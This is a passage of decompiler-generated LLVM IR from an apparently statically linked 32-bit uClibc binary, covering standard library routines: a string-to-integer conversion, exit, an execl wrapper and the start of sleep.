  store i32 %arg3, i32* %esi.global-to-local, align 4
  %v0_80515b7 = load i32, i32* @global_var_805a438, align 8
  store i32 %v0_80515b7, i32* %edx.global-to-local, align 4
  store i32 %v4_80515af, i32* %ebx.global-to-local, align 4
  %v2_80515c241 = load i8, i8* %arg1, align 1
  %v3_80515c242 = sext i8 %v2_80515c241 to i32
  store i32 %v3_80515c242, i32* %eax.global-to-local, align 4
  %v2_80515c543 = mul nsw i32 %v3_80515c242, 2
  %v3_80515c544 = add i32 %v2_80515c543, %v0_80515b7
  %v4_80515c545 = inttoptr i32 %v3_80515c544 to i8*
  %v5_80515c546 = load i8, i8* %v4_80515c545, align 1
  %v6_80515c547 = and i8 %v5_80515c546, 32
  %v7_80515c548 = icmp eq i8 %v6_80515c547, 0
  %v1_80515c949 = icmp eq i1 %v7_80515c548, false
  br i1 %v1_80515c949, label %dec_label_pc_80515c1, label %dec_label_pc_80515cb

dec_label_pc_80515c1:                             ; preds = %entry, %dec_label_pc_80515c1
  %v0_80515c150 = phi i32 [ %v1_80515c1, %dec_label_pc_80515c1 ], [ %v4_80515af, %entry ]
  %v1_80515c1 = add i32 %v0_80515c150, 1
  store i32 %v1_80515c1, i32* %ebx.global-to-local, align 4
  %v1_80515c2 = inttoptr i32 %v1_80515c1 to i8*
  %v2_80515c2 = load i8, i8* %v1_80515c2, align 1
  %v3_80515c2 = sext i8 %v2_80515c2 to i32
  store i32 %v3_80515c2, i32* %eax.global-to-local, align 4
  %v2_80515c5 = mul nsw i32 %v3_80515c2, 2
  %v3_80515c5 = add i32 %v2_80515c5, %v0_80515b7
  %v4_80515c5 = inttoptr i32 %v3_80515c5 to i8*
  %v5_80515c5 = load i8, i8* %v4_80515c5, align 1
  %v6_80515c5 = and i8 %v5_80515c5, 32
  %v7_80515c5 = icmp eq i8 %v6_80515c5, 0
  %v1_80515c9 = icmp eq i1 %v7_80515c5, false
  br i1 %v1_80515c9, label %dec_label_pc_80515c1, label %dec_label_pc_80515cb

dec_label_pc_80515cb:                             ; preds = %dec_label_pc_80515c1, %entry
  %v0_80515c1.lcssa = phi i32 [ %v4_80515af, %entry ], [ %v1_80515c1, %dec_label_pc_80515c1 ]
  %v2_80515c2.lcssa = phi i8 [ %v2_80515c241, %entry ], [ %v2_80515c2, %dec_label_pc_80515c1 ]
  %v3_80515c2.lcssa = phi i32 [ %v3_80515c242, %entry ], [ %v3_80515c2, %dec_label_pc_80515c1 ]
  %tmp37 = trunc i32 %arg4 to i8
  %v9_80515cb = icmp eq i8 %v2_80515c2.lcssa, 43
  br i1 %v9_80515cb, label %dec_label_pc_80515e6, label %dec_label_pc_80515d0

dec_label_pc_80515d0:                             ; preds = %dec_label_pc_80515cb
  %v9_80515d0 = icmp eq i8 %v2_80515c2.lcssa, 45
  %v1_80515d8 = icmp eq i1 %v9_80515d0, false
  br i1 %v1_80515d8, label %dec_label_pc_80515e7, label %dec_label_pc_80515e6

dec_label_pc_80515e6:                             ; preds = %dec_label_pc_80515cb, %dec_label_pc_80515d0
  %storemerge5 = phi i8 [ 1, %dec_label_pc_80515d0 ], [ 0, %dec_label_pc_80515cb ]
  %v1_80515e6 = add i32 %v0_80515c1.lcssa, 1
  store i32 %v1_80515e6, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80515e7

dec_label_pc_80515e7:                             ; preds = %dec_label_pc_80515d0, %dec_label_pc_80515e6
  %v0_80515f9 = phi i32 [ %v1_80515e6, %dec_label_pc_80515e6 ], [ %v0_80515c1.lcssa, %dec_label_pc_80515d0 ]
  %stack_var_-18.0 = phi i8 [ %storemerge5, %dec_label_pc_80515e6 ], [ 0, %dec_label_pc_80515d0 ]
  %v1_80515e7 = and i32 %arg3, -17
  %v2_80515e7 = icmp eq i32 %v1_80515e7, 0
  %v1_80515ef = icmp eq i1 %v2_80515e7, false
  br i1 %v1_80515ef, label %dec_label_pc_8051615, label %dec_label_pc_80515f1

dec_label_pc_80515f1:                             ; preds = %dec_label_pc_80515e7
  %v1_80515f1 = add i32 %arg3, 10
  store i32 %v1_80515f1, i32* %esi.global-to-local, align 4
  %v1_80515f4 = inttoptr i32 %v0_80515f9 to i8*
  %v2_80515f4 = load i8, i8* %v1_80515f4, align 1
  %v8_80515f4 = icmp eq i8 %v2_80515f4, 48
  %v1_80515f7 = icmp eq i1 %v8_80515f4, false
  br i1 %v1_80515f7, label %dec_label_pc_805160a, label %dec_label_pc_80515f9

dec_label_pc_80515f9:                             ; preds = %dec_label_pc_80515f1
  %v1_80515f9 = add i32 %v0_80515f9, 1
  store i32 %v1_80515f9, i32* %ebx.global-to-local, align 4
  %v1_80515fa = add i32 %arg3, 8
  store i32 %v1_80515fa, i32* %esi.global-to-local, align 4
  %v1_80515fd = inttoptr i32 %v1_80515f9 to i8*
  %v2_80515fd = load i8, i8* %v1_80515fd, align 1
  %v2_8051601 = or i8 %v2_80515fd, 32
  %v7_8051601 = zext i8 %v2_8051601 to i32
  %v9_8051601 = and i32 %v3_80515c2.lcssa, -256
  %v10_8051601 = or i32 %v7_8051601, %v9_8051601
  store i32 %v10_8051601, i32* %eax.global-to-local, align 4
  %v10_8051603 = icmp eq i8 %v2_8051601, 120
  %v1_8051605 = icmp eq i1 %v10_8051603, false
  br i1 %v1_8051605, label %dec_label_pc_805160a, label %dec_label_pc_8051607

dec_label_pc_8051607:                             ; preds = %dec_label_pc_80515f9
  %v2_8051607 = mul i32 %v1_80515fa, 2
  store i32 %v2_8051607, i32* %esi.global-to-local, align 4
  %v1_8051609 = add i32 %v0_80515f9, 2
  store i32 %v1_8051609, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_805160a

dec_label_pc_805160a:                             ; preds = %dec_label_pc_80515f9, %dec_label_pc_80515f1, %dec_label_pc_8051607
  %v0_805163213 = phi i32 [ %v1_80515f9, %dec_label_pc_80515f9 ], [ %v0_80515f9, %dec_label_pc_80515f1 ], [ %v1_8051609, %dec_label_pc_8051607 ]
  %v0_805168c22 = phi i32 [ %v1_80515f9, %dec_label_pc_80515f9 ], [ %v4_80515af, %dec_label_pc_80515f1 ], [ %v1_80515f9, %dec_label_pc_8051607 ]
  %v3_8051612 = phi i32 [ %v1_80515fa, %dec_label_pc_80515f9 ], [ %v1_80515f1, %dec_label_pc_80515f1 ], [ %v2_8051607, %dec_label_pc_8051607 ]
  %v1_805160a = add i32 %v3_8051612, -17
  %v6_805160a = sub i32 16, %v3_8051612
  %v7_805160a = and i32 %v6_805160a, %v3_8051612
  %v8_805160a = icmp slt i32 %v7_805160a, 0
  %v10_805160a = icmp slt i32 %v1_805160a, 0
  store i32 16, i32* %eax.global-to-local, align 4
  %v2_8051612 = icmp eq i1 %v10_805160a, %v8_805160a
  %v5_8051612 = select i1 %v2_8051612, i32 16, i32 %v3_8051612
  store i32 %v5_8051612, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8051615

dec_label_pc_8051615:                             ; preds = %dec_label_pc_80515e7, %dec_label_pc_805160a
  %v0_805168c23 = phi i32 [ %v4_80515af, %dec_label_pc_80515e7 ], [ %v0_805168c22, %dec_label_pc_805160a ]
  %v0_805163212 = phi i32 [ %v0_80515f9, %dec_label_pc_80515e7 ], [ %v0_805163213, %dec_label_pc_805160a ]
  %v0_8051624 = phi i32 [ %arg3, %dec_label_pc_80515e7 ], [ %v5_8051612, %dec_label_pc_805160a ]
  %v1_8051615 = add i32 %v0_8051624, -2
  store i32 %v1_8051615, i32* %eax.global-to-local, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v6_805161d = icmp ugt i32 %v1_8051615, 34
  br i1 %v6_805161d, label %dec_label_pc_8051681, label %dec_label_pc_805161f

dec_label_pc_805161f:                             ; preds = %dec_label_pc_8051615
  %div = udiv i32 -1, %v0_8051624
  store i32 %div, i32* %eax.global-to-local, align 4
  %tmp38 = urem i32 -1, %v0_8051624
  %v1_8051626 = trunc i32 %tmp38 to i8
  store i32 %div, i32* %ebp.global-to-local, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v4_805165f = urem i32 %arg4, 256
  br label %dec_label_pc_8051632

dec_label_pc_8051630:                             ; preds = %dec_label_pc_8051677, %dec_label_pc_805165f
  %v2_8051634.pre = phi i32 [ %v0_805167a, %dec_label_pc_8051677 ], [ %v2_8051634.pre.pre, %dec_label_pc_805165f ]
  %v4_8051632.pre = phi i32 [ %v1_805164b, %dec_label_pc_8051677 ], [ %v4_8051632.pre.pre, %dec_label_pc_805165f ]
  %v0_8051630 = phi i32 [ %v1_8051652, %dec_label_pc_8051677 ], [ %v0_8051630.pre, %dec_label_pc_805165f ]
  %stack_var_-18.1 = phi i8 [ %stack_var_-18.2, %dec_label_pc_8051677 ], [ %v6_8051663, %dec_label_pc_805165f ]
  br label %dec_label_pc_8051632

dec_label_pc_8051632:                             ; preds = %dec_label_pc_805161f, %dec_label_pc_8051630
  %v0_805168c21 = phi i32 [ %v0_805168c23, %dec_label_pc_805161f ], [ %v0_8051630, %dec_label_pc_8051630 ]
  %v0_8051652 = phi i32 [ %v0_805163212, %dec_label_pc_805161f ], [ %v0_8051630, %dec_label_pc_8051630 ]
  %v2_8051634 = phi i32 [ %v4_80515af, %dec_label_pc_805161f ], [ %v2_8051634.pre, %dec_label_pc_8051630 ]
  %v4_8051632 = phi i32 [ %div, %dec_label_pc_805161f ], [ %v4_8051632.pre, %dec_label_pc_8051630 ]
  %stack_var_-18.2 = phi i8 [ %stack_var_-18.0, %dec_label_pc_805161f ], [ %stack_var_-18.1, %dec_label_pc_8051630 ]
  %v1_8051632 = inttoptr i32 %v0_8051652 to i8*
  %v2_8051632 = load i8, i8* %v1_8051632, align 1
  %v3_8051632 = zext i8 %v2_8051632 to i32
  %v5_8051632 = and i32 %v4_8051632, -256
  %v6_8051632 = or i32 %v3_8051632, %v5_8051632
  store i32 %v6_8051632, i32* %eax.global-to-local, align 4
  %v2_8051636 = add i8 %v2_8051632, -48
  %v12_8051636 = zext i8 %v2_8051636 to i32
  %v14_8051636 = and i32 %v2_8051634, -256
  %v15_8051636 = or i32 %v12_8051636, %v14_8051636
  store i32 %v15_8051636, i32* @ecx, align 4
  %tmp = icmp ult i8 %v2_8051636, 10
  br i1 %tmp, label %dec_label_pc_805164b, label %dec_label_pc_805163e

dec_label_pc_805163e:                             ; preds = %dec_label_pc_8051632
  %v2_805163e = or i8 %v2_8051632, 32
  %v7_805163e = zext i8 %v2_805163e to i32
  %v10_805163e = or i32 %v7_805163e, %v5_8051632
  store i32 %v10_805163e, i32* %eax.global-to-local, align 4
  %v2_8051640 = or i32 %v14_8051636, 40
  store i32 %v2_8051640, i32* @ecx, align 4
  %tmp55 = icmp ult i8 %v2_805163e, 97
  br i1 %tmp55, label %dec_label_pc_805164b, label %dec_label_pc_8051646

dec_label_pc_8051646:                             ; preds = %dec_label_pc_805163e
  %v2_8051648 = add i8 %v2_805163e, -87
  %v15_8051648 = zext i8 %v2_8051648 to i32
  %v18_8051648 = or i32 %v15_8051648, %v14_8051636
  store i32 %v18_8051648, i32* @ecx, align 4
  br label %dec_label_pc_805164b

dec_label_pc_805164b:                             ; preds = %dec_label_pc_805163e, %dec_label_pc_8051632, %dec_label_pc_8051646
  %v0_805167a = phi i32 [ %v2_8051640, %dec_label_pc_805163e ], [ %v15_8051636, %dec_label_pc_8051632 ], [ %v18_8051648, %dec_label_pc_8051646 ]
  %v1_805164b = urem i32 %v0_805167a, 256
  store i32 %v1_805164b, i32* %eax.global-to-local, align 4
  %v1_805164e = load i32, i32* %esi.global-to-local, align 4
  %v2_805164e = sub i32 %v1_805164b, %v1_805164e
  %v10_805164e = and i32 %v2_805164e, %v1_805164e
  %v11_805164e = icmp slt i32 %v10_805164e, 0
  %v13_805164e = icmp slt i32 %v2_805164e, 0
  %v2_8051650 = icmp eq i1 %v13_805164e, %v11_805164e
  br i1 %v2_8051650, label %dec_label_pc_8051681, label %dec_label_pc_8051652

dec_label_pc_8051652:                             ; preds = %dec_label_pc_805164b
  %v1_8051652 = add i32 %v0_8051652, 1
  store i32 %v1_8051652, i32* %ebx.global-to-local, align 4
  %v0_8051653 = load i32, i32* %edx.global-to-local, align 4
  %v1_8051653 = load i32, i32* %ebp.global-to-local, align 4
  %tmp56 = icmp ugt i32 %v0_8051653, %v1_8051653
  br i1 %tmp56, label %dec_label_pc_805165f, label %dec_label_pc_8051657

dec_label_pc_8051657:                             ; preds = %dec_label_pc_8051652
  %v12_8051653 = icmp eq i32 %v0_8051653, %v1_8051653
  %v1_8051657 = icmp eq i1 %v12_8051653, false
  br i1 %v1_8051657, label %dec_label_pc_8051677, label %dec_label_pc_8051659

dec_label_pc_8051659:                             ; preds = %dec_label_pc_8051657
  %v1_8051659 = trunc i32 %v0_805167a to i8
  %tmp57 = icmp ugt i8 %v1_8051659, %v1_8051626
  br i1 %tmp57, label %dec_label_pc_805165f, label %dec_label_pc_8051677

dec_label_pc_805165f:                             ; preds = %dec_label_pc_8051659, %dec_label_pc_8051652
  store i32 %v4_805165f, i32* %eax.global-to-local, align 4
  %v6_8051663 = and i8 %stack_var_-18.2, %tmp37
  %v1_8051667 = sext i8 %v6_8051663 to i32
  %v2_8051667 = call i32 @__errno_location(i32 %v1_8051667)
  store i32 %v2_8051667, i32* %eax.global-to-local, align 4
  store i32 -1, i32* %edx.global-to-local, align 4
  %v1_805166f = inttoptr i32 %v2_8051667 to i32*
  store i32 34, i32* %v1_805166f, align 4
  %v0_8051630.pre = load i32, i32* %ebx.global-to-local, align 4
  %v4_8051632.pre.pre = load i32, i32* %eax.global-to-local, align 4
  %v2_8051634.pre.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_8051630

dec_label_pc_8051677:                             ; preds = %dec_label_pc_8051659, %dec_label_pc_8051657
  %v4_8051677 = mul i32 %v0_8051653, %v1_805164e
  store i32 %v1_805164b, i32* %eax.global-to-local, align 4
  %v2_805167d = add i32 %v4_8051677, %v1_805164b
  store i32 %v2_805167d, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8051630

dec_label_pc_8051681:                             ; preds = %dec_label_pc_805164b, %dec_label_pc_8051615
  %v0_805168c = phi i32 [ %v0_805168c23, %dec_label_pc_8051615 ], [ %v0_805168c21, %dec_label_pc_805164b ]
  %stack_var_-18.3 = phi i8 [ %stack_var_-18.0, %dec_label_pc_8051615 ], [ %stack_var_-18.2, %dec_label_pc_805164b ]
  %v4_8051681 = icmp eq i32 %arg2, 0
  br i1 %v4_8051681, label %dec_label_pc_805168e, label %dec_label_pc_8051688

dec_label_pc_8051688:                             ; preds = %dec_label_pc_8051681
  store i32 %arg2, i32* %eax.global-to-local, align 4
  %v2_805168c = inttoptr i32 %arg2 to i32*
  store i32 %v0_805168c, i32* %v2_805168c, align 4
  br label %dec_label_pc_805168e

dec_label_pc_805168e:                             ; preds = %dec_label_pc_8051681, %dec_label_pc_8051688
  %v8_805168e = icmp eq i8 %stack_var_-18.3, 0
  %v2_8051693 = zext i1 %v8_805168e to i32
  %v13_8051693 = icmp eq i1 %v8_805168e, false
  %v1_80516953 = or i32 %v2_8051693, -2147483648
  store i32 %v1_80516953, i32* %ebx.global-to-local, align 4
  %v5_805169b = icmp eq i8 %tmp37, 0
  br i1 %v5_805169b, label %dec_label_pc_80516b3, label %dec_label_pc_80516a2

dec_label_pc_80516a2:                             ; preds = %dec_label_pc_805168e
  %v0_80516a2 = load i32, i32* %edx.global-to-local, align 4
  %tmp58 = icmp ugt i32 %v0_80516a2, %v1_80516953
  br i1 %tmp58, label %dec_label_pc_80516a6, label %dec_label_pc_80516b3

dec_label_pc_80516a6:                             ; preds = %dec_label_pc_80516a2
  %v1_80516a6 = sext i8 %stack_var_-18.3 to i32
  %v2_80516a6 = call i32 @__errno_location(i32 %v1_80516a6)
  store i32 %v2_80516a6, i32* %eax.global-to-local, align 4
  %v0_80516ab = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_80516ab, i32* %edx.global-to-local, align 4
  %v1_80516ad = inttoptr i32 %v2_80516a6 to i32*
  store i32 34, i32* %v1_80516ad, align 4
  br label %dec_label_pc_80516b3

dec_label_pc_80516b3:                             ; preds = %dec_label_pc_80516a2, %dec_label_pc_805168e, %dec_label_pc_80516a6
  %v0_80516b3 = load i32, i32* %edx.global-to-local, align 4
  %v1_80516b5 = sub i32 0, %v0_80516b3
  %v4_80516bc = select i1 %v13_8051693, i32 %v1_80516b5, i32 %v0_80516b3
  store i32 %v4_80516bc, i32* @edx, align 4
  %v2_80516c2 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_80516c2, i32* @ebx, align 4
  store i32 %v4_80516bc, i32* %eax.global-to-local, align 4
  ret i32 %v4_80516bc

; uselistorder directives
  uselistorder i32 %v4_80516bc, { 1, 0, 2 }
  uselistorder i1 %v8_805168e, { 1, 0 }
  uselistorder i8 %v6_8051663, { 1, 0 }
  uselistorder i32 %v1_8051653, { 1, 0 }
  uselistorder i32 %v0_8051653, { 2, 1, 0 }
  uselistorder i32 %v1_8051652, { 1, 0 }
  uselistorder i32 %v2_805164e, { 1, 0 }
  uselistorder i32 %v1_805164b, { 4, 2, 1, 0, 3 }
  uselistorder i32 %v0_805167a, { 2, 0, 1 }
  uselistorder i8 %v2_805163e, { 1, 0, 2 }
  uselistorder i32 %v14_8051636, { 0, 2, 1 }
  uselistorder i32 %v0_8051630, { 1, 0 }
  uselistorder i32 %v0_8051624, { 1, 0, 2 }
  uselistorder i32 %v3_8051612, { 1, 0, 3, 2 }
  uselistorder i32 %v2_8051607, { 1, 0 }
  uselistorder i32 %v1_80515fa, { 1, 0, 2 }
  uselistorder i8 %stack_var_-18.0, { 1, 0 }
  uselistorder i32 %v0_80515f9, { 1, 2, 0, 3, 4 }
  uselistorder i8 %tmp37, { 1, 0 }
  uselistorder i8 %v2_80515c2.lcssa, { 1, 0 }
  uselistorder i32 %v0_80515c1.lcssa, { 1, 0 }
  uselistorder i32 %v1_80515c1, { 0, 3, 2, 1 }
  uselistorder i32 %v0_80515b7, { 1, 0, 2 }
  uselistorder i32 %v4_80515af, { 5, 4, 3, 0, 1, 2, 6 }
  uselistorder i32* %esi.global-to-local, { 4, 0, 1, 2, 3, 5 }
  uselistorder i32* %edx.global-to-local, { 5, 0, 6, 1, 2, 3, 4, 7, 8 }
  uselistorder i32* %ebx.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 0 }
  uselistorder i32* %eax.global-to-local, { 1, 2, 3, 4, 10, 11, 5, 6, 7, 8, 9, 12, 13, 14, 15, 0 }
  uselistorder i8 -87, { 1, 0 }
  uselistorder i32 -17, { 2, 4, 0, 3, 1 }
  uselistorder i32 %arg3, { 1, 0, 2, 3, 4 }
  uselistorder i32 %arg2, { 2, 1, 0 }
  uselistorder label %dec_label_pc_80516b3, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805168e, { 1, 0 }
  uselistorder label %dec_label_pc_805164b, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8051632, { 1, 0 }
  uselistorder label %dec_label_pc_8051615, { 1, 0 }
  uselistorder label %dec_label_pc_805160a, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80515e7, { 1, 0 }
  uselistorder label %dec_label_pc_80515e6, { 1, 0 }
  uselistorder label %dec_label_pc_80515c1, { 1, 0 }
}

define i32 @__GI_exit(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg1, i32* @esi, align 4
  %v2_80516df = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_80516df, i32* @ebx, align 4
  %v2_80516e4 = call i32 @__pthread_return_void(i32 %v2_80516df, i32 134552291)
  %v1_80516f0 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_805a680.217 to i32))
  %v0_80516f5 = load i32, i32* @global_var_8060924.218, align 4
  store i32 %v0_80516f5, i32* @eax, align 4
  %v1_80516fd = icmp eq i32 %v0_80516f5, 0
  br i1 %v1_80516fd, label %dec_label_pc_805170a, label %dec_label_pc_8051701

dec_label_pc_8051701:                             ; preds = %entry
  %v0_8051704 = load i32, i32* @esi, align 4
  %v1_8051705 = call i32 @unknown_0(i32 %v0_8051704)
  store i32 %v1_8051705, i32* @eax, align 4
  br label %dec_label_pc_805170a

dec_label_pc_805170a:                             ; preds = %entry, %dec_label_pc_8051701
  %v2_805170f = call i32 @__pthread_return_void(i32 %v2_80516df, i32 1)
  %v0_8051714 = call i32 @__GI___uClibc_fini()
  %v0_8051725 = call i32 @_stdio_term()
  %v0_805172d = load i32, i32* @esi, align 4
  %v1_805172e = call i32 @__GI__exit(i32 %v0_805172d)
  unreachable

; uselistorder directives
  uselistorder i32 (i32)* @__GI__exit, { 1, 0, 10, 9, 8, 7, 6, 5, 4, 3, 2 }
  uselistorder label %dec_label_pc_805170a, { 1, 0 }
}

define i32 @execl(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_12 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  store i32 0, i32* %esi.global-to-local, align 4
  %v0_805173a = load i32, i32* @ebx, align 4
  store i32 %v0_805173a, i32* %stack_var_-12, align 4
  %v2_805173b = ptrtoint i32* %stack_var_12 to i32
  store i32 %v2_805173b, i32* %eax.global-to-local, align 4
  %v12_805173e = ptrtoint i32* %stack_var_-28 to i32
  br label %dec_label_pc_8051744

dec_label_pc_8051744:                             ; preds = %dec_label_pc_8051744, %entry
  %v0_8051747 = phi i32 [ 0, %entry ], [ %v1_8051747, %dec_label_pc_8051744 ]
  %stack_var_-16.0 = phi i32 [ %v2_805173b, %entry ], [ %v1_8051748, %dec_label_pc_8051744 ]
  %v1_8051747 = add i32 %v0_8051747, 1
  store i32 %v1_8051747, i32* %esi.global-to-local, align 4
  %v1_8051748 = add i32 %stack_var_-16.0, 4
  store i32 %v1_8051748, i32* %eax.global-to-local, align 4
  %v1_805174e = inttoptr i32 %stack_var_-16.0 to i32*
  %v2_805174e = load i32, i32* %v1_805174e, align 4
  %v3_805174e = icmp eq i32 %v2_805174e, 0
  %v1_8051751 = icmp eq i1 %v3_805174e, false
  br i1 %v1_8051751, label %dec_label_pc_8051744, label %dec_label_pc_8051753

dec_label_pc_8051753:                             ; preds = %dec_label_pc_8051744
  %v1_8051753 = mul i32 %v1_8051747, 4
  %v2_8051753 = add i32 %v1_8051753, 34
  %v1_805175a = and i32 %v2_8051753, -16
  %v2_805175d = sub i32 %v12_805173e, %v1_805175a
  %v1_8051762 = add i32 %v2_805175d, 15
  %v1_8051766 = and i32 %v1_8051762, -16
  store i32 %v1_8051766, i32* @ebx, align 4
  store i32 %v1_8051766, i32* %ecx.global-to-local, align 4
  %v2_805176b = inttoptr i32 %v1_8051766 to i32*
  store i32 %arg2, i32* %v2_805176b, align 16
  store i32 %v2_805173b, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8051773

dec_label_pc_8051773:                             ; preds = %dec_label_pc_8051773, %dec_label_pc_8051753
  %stack_var_-16.1 = phi i32 [ %v2_805173b, %dec_label_pc_8051753 ], [ %v1_805177a, %dec_label_pc_8051773 ]
  store i32 %stack_var_-16.1, i32* %eax.global-to-local, align 4
  %v0_8051776 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8051776 = add i32 %v0_8051776, 4
  store i32 %v1_8051776, i32* %ecx.global-to-local, align 4
  %v0_8051779 = load i32, i32* %esi.global-to-local, align 4
  %v1_8051779 = add i32 %v0_8051779, -1
  %v8_8051779 = icmp eq i32 %v1_8051779, 0
  store i32 %v1_8051779, i32* %esi.global-to-local, align 4
  %v1_805177a = add i32 %stack_var_-16.1, 4
  %v1_8051780 = inttoptr i32 %stack_var_-16.1 to i32*
  %v2_8051780 = load i32, i32* %v1_8051780, align 4
  store i32 %v2_8051780, i32* %eax.global-to-local, align 4
  %v2_8051782 = inttoptr i32 %v1_8051776 to i32*
  store i32 %v2_8051780, i32* %v2_8051782, align 4
  %v1_8051784 = icmp eq i1 %v8_8051779, false
  br i1 %v1_8051784, label %dec_label_pc_8051773, label %dec_label_pc_8051786

dec_label_pc_8051786:                             ; preds = %dec_label_pc_8051773
  %v0_8051786 = load i32, i32* %eax.global-to-local, align 4
  %v1_8051786 = load i32, i32* @esp, align 4
  %v2_8051786 = add i32 %v1_8051786, -4
  %v3_8051786 = inttoptr i32 %v2_8051786 to i32*
  store i32 %v0_8051786, i32* %v3_8051786, align 4
  %v0_8051787 = load i32, i32* @global_var_806092c.219, align 4
  %v2_8051787 = add i32 %v1_8051786, -8
  %v3_8051787 = inttoptr i32 %v2_8051787 to i32*
  store i32 %v0_8051787, i32* %v3_8051787, align 4
  %v0_805178d = load i32, i32* @ebx, align 4
  %v2_805178d = add i32 %v1_8051786, -12
  %v3_805178d = inttoptr i32 %v2_805178d to i32*
  store i32 %v0_805178d, i32* %v3_805178d, align 4
  %v5_805178e = add i32 %v1_8051786, -16
  %v6_805178e = inttoptr i32 %v5_805178e to i32*
  store i32 %arg1, i32* %v6_805178e, align 4
  %v1_8051791 = inttoptr i32 %v1_805177a to i8*
  %v2_8051791 = call i32 @__GI_execve(i8* %v1_8051791)
  store i32 %v2_8051791, i32* %eax.global-to-local, align 4
  %v2_8051799 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8051799, i32* @ebx, align 4
  ret i32 %v2_8051791

; uselistorder directives
  uselistorder i32 %v1_8051779, { 1, 0 }
  uselistorder i32 %stack_var_-16.1, { 1, 0, 2 }
  uselistorder i32 %v1_8051748, { 1, 0 }
  uselistorder i32 %v1_8051747, { 0, 2, 1 }
  uselistorder i32 %stack_var_-16.0, { 1, 0 }
  uselistorder i32 %v2_805173b, { 0, 2, 1, 3 }
}

define i32 @sleep(i32 %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-420 = alloca i32, align 4
  %stack_var_-280 = alloca i32, align 4
  %stack_var_-460 = alloca i32, align 4
  %stack_var_-152 = alloca i32, align 4
  %stack_var_-444 = alloca i32, align 4
  store i32 32, i32* %eax.global-to-local, align 4
  %v0_80517a6 = load i32, i32* @edi, align 4
  %v0_80517a7 = load i32, i32* @esi, align 4
  %v0_80517a8 = load i32, i32* @ebx, align 4
  %v15_80517a9 = ptrtoint i32* %stack_var_-444 to i32
  store i32 %arg1, i32* %edx.global-to-local, align 4
  %v1_80517b6 = icmp eq i32 %arg1, 0
  %v1_80517b8 = icmp eq i1 %v1_80517b6, false
  br i1 %v1_80517b8, label %dec_label_pc_80517ca.preheader, label %dec_label_pc_8051917

dec_label_pc_80517ca.preheader:                   ; preds = %entry
  store i32 31, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80517bf

dec_label_pc_80517bf:                             ; preds = %dec_label_pc_80517bf.dec_label_pc_80517bf_crit_edge, %dec_label_pc_80517ca.preheader
  %v0_80517bf = phi i32 [ %v15_80517a9, %dec_label_pc_80517ca.preheader ], [ %v0_80517bf.pre, %dec_label_pc_80517bf.dec_label_pc_80517bf_crit_edge ]
  %v1_80517ca27 = phi i32 [ 31, %dec_label_pc_80517ca.preheader ], [ %v1_80517ca, %dec_label_pc_80517bf.dec_label_pc_80517bf_crit_edge ]
  %v2_80517bf = mul i32 %v1_80517ca27, 4
  %v3_80517bf = add i32 %v2_80517bf, 292
  %v4_80517bf = add i32 %v3_80517bf, %v0_80517bf
  %v5_80517bf = inttoptr i32 %v4_80517bf to i32*
  store i32 0, i32* %v5_80517bf, align 4
  %v0_80517ca.pre = load i32, i32* %eax.global-to-local, align 4
  %v1_80517ca = add i32 %v0_80517ca.pre, -1
  %v9_80517ca = icmp slt i32 %v1_80517ca, 0
  store i32 %v1_80517ca, i32* %eax.global-to-local, align 4
  %v1_80517cb = icmp eq i1 %v9_80517ca, false
  br i1 %v1_80517cb, label %dec_label_pc_80517bf.dec_label_pc_80517bf_crit_edge, label %dec_label_pc_80517cd

dec_label_pc_80517bf.dec_label_pc_80517bf_crit_edge: ; preds = %dec_label_pc_80517bf
  %v0_80517bf.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_80517bf

dec_label_pc_80517cd:                             ; preds = %dec_label_pc_80517bf
  store i32 %arg1, i32* %stack_var_-24, align 4
  %v2_80517e3 = ptrtoint i32* %stack_var_-152 to i32
  store i32 %v2_80517e3, i32* @ebx, align 4
  store i32 %v2_80517e3, i32* %stack_var_-460, align 4
  %v4_80517eb = call i32 @__sigaddset(i32 %v2_80517e3, i32 17, i32 %v1_80517ca, i32 %v1_80517ca)
  store i32 %v4_80517eb, i32* %eax.global-to-local, align 4
  %v2_80517f3 = icmp slt i32 %v4_80517eb, 0
  br i1 %v2_80517f3, label %dec_label_pc_805191b, label %dec_label_pc_80517fb

dec_label_pc_80517fb:                             ; preds = %dec_label_pc_80517cd
  %v2_80517fc = ptrtoint i32* %stack_var_-280 to i32
  store i32 %v2_80517fc, i32* @esi, align 4
  store i32 0, i32* %stack_var_-460, align 4
  %v3_8051807 = bitcast i32* %stack_var_-152 to %_TYPEDEF_sigset_t*
  %v4_8051807 = call i32 @__GI_sigprocmask(i32 0, %_TYPEDEF_sigset_t* %v3_8051807, i32 %v2_80517fc)
  store i32 %v4_8051807, i32* %eax.global-to-local, align 4
  %v1_805180f = icmp eq i32 %v4_8051807, 0
  %v1_8051811 = icmp eq i1 %v1_805180f, false
  br i1 %v1_8051811, label %dec_label_pc_805191b, label %dec_label_pc_8051817

dec_label_pc_8051817:                             ; preds = %dec_label_pc_80517fb
